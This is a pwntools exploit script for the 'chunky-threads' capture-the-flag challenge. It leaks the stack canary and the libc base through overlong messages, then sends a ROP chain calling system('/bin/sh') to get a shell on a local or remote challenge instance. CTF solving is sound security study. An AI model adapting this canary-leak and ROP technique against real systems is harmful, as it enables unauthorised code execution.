#!/usr/bin/env python3
import sys

from pwn import *

BINARY_PATH = "/ctf-writeups/2025/l3akctf/pwn/chunky-threads/dist/chall"
LIBC_PATH = "/ctf-writeups/2025/l3akctf/pwn/chunky-threads/dist/libc.so.6"
REMOTE_HOST = "34.45.81.67"
REMOTE_PORT = 16006

context.binary = BINARY_PATH
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h", "-p 65"]

elf = context.binary
libc = ELF(LIBC_PATH)

is_remote = len(sys.argv) == 2 and sys.argv[1] == "remote"


def attach(r):
    if is_remote:
        return

    bkps = []
    gdb.attach(r, "\n".join(f"break {x}" for x in bkps))


def create_thread(r, timeout, repeat, msg):
    r.send(f"CHUNK {timeout} {repeat} ".encode() + msg)


def leak_canary(r):
    r.sendline(b"CHUNKS 10")
    r.recvuntil(b"10\n")

    payload = b"A" * 0x49
    create_thread(r, 1000, 1, payload)
    r.recvuntil(payload)

    canary = u64(r.recv(7).strip().rjust(8, b"\x00"))
    return canary


def leak_libc_base(r):
    payload = b"A" * 0x58
    create_thread(r, 1000, 1, payload)
    r.recvuntil(payload)

    leaked = r.recvline().strip().ljust(8, b"\x00")
    start_thread = u64(leaked)
    libc_base = start_thread - 0x9caa4
    return libc_base


def build_rop(canary):
    rop = ROP(libc)
    rop.raw(b"A" * 0x48)
    rop.raw(canary)
    rop.raw(0)
    rop.raw(rop.ret)
    rop.call(libc.sym.system, [next(libc.search(b"/bin/sh"))])
    return rop.chain()


def exploit(r):
    attach(r)

    canary = leak_canary(r)
    libc.address = leak_libc_base(r)

    payload = build_rop(canary)
    create_thread(r, 0, 1, payload)

    r.interactive()


def main():
    if is_remote:
        r = remote(REMOTE_HOST, REMOTE_PORT)
    else:
        r = process(elf.path)

    exploit(r)


if __name__ == "__main__":
    main()
